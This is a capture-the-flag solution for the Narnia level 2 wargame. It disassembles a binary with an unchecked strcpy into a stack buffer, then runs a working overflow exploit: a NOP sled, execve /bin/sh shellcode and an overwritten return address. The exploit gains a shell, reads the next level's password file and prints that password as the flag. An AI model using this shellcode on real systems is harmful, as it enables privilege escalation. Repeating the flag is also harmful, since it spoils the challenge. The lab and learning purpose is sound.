# LEVEL GOAL

There is no information for this level, intentionally.

# HINTS

None

# SOLUTION

```
narnia2@narnia:/narnia$ gdb -q narnia2
Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804844b <+0>:	push   %ebp
   0x0804844c <+1>:	mov    %esp,%ebp
   0x0804844e <+3>:	add    $0xffffff80,%esp
   0x08048451 <+6>:	cmpl   $0x1,0x8(%ebp)
   0x08048455 <+10>:	jne    0x8048471 <main+38>
   0x08048457 <+12>:	mov    0xc(%ebp),%eax
   0x0804845a <+15>:	mov    (%eax),%eax
   0x0804845c <+17>:	push   %eax
   0x0804845d <+18>:	push   $0x8048520
   0x08048462 <+23>:	call   0x8048300 <printf@plt>
   0x08048467 <+28>:	add    $0x8,%esp
   0x0804846a <+31>:	push   $0x1
   0x0804846c <+33>:	call   0x8048320 <exit@plt>
   0x08048471 <+38>:	mov    0xc(%ebp),%eax
   0x08048474 <+41>:	add    $0x4,%eax
   0x08048477 <+44>:	mov    (%eax),%eax
   0x08048479 <+46>:	push   %eax
   0x0804847a <+47>:	lea    -0x80(%ebp),%eax
   0x0804847d <+50>:	push   %eax
   0x0804847e <+51>:	call   0x8048310 <strcpy@plt>
   0x08048483 <+56>:	add    $0x8,%esp
   0x08048486 <+59>:	lea    -0x80(%ebp),%eax
   0x08048489 <+62>:	push   %eax
   0x0804848a <+63>:	push   $0x8048534
   0x0804848f <+68>:	call   0x8048300 <printf@plt>
   0x08048494 <+73>:	add    $0x8,%esp
   0x08048497 <+76>:	mov    $0x0,%eax
   0x0804849c <+81>:	leave  
   0x0804849d <+82>:	ret    
End of assembler dump.

(gdb) b * 0x08048483
Breakpoint 1 at 0x8048483

(gdb) r AAAABBBBCCCC
Starting program: /narnia/narnia2 AAAABBBBCCCC

Breakpoint 1, 0x08048483 in main ()

(gdb) i r
eax            0xffffd638	-10696
ecx            0xffffd894	-10092
edx            0xffffd638	-10696
ebx            0x0	0
esp            0xffffd630	0xffffd630
ebp            0xffffd6b8	0xffffd6b8
esi            0x2	2
edi            0xf7fc5000	-134459392
eip            0x8048483	0x8048483 <main+56>
eflags         0x246	[ PF ZF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99

(gdb) q
A debugging session is active.

	Inferior 1 [process 14336] will be killed.

Quit anyway? (y or n) y
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print ("\x90"*64 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x90"*43 + "\xe8\xd5\xff\xff")')

$ whoami
narnia3

$ cat /etc/narnia_pass/narnia3
vaequeezee

$ exit
```

# FLAG

vaequeezee
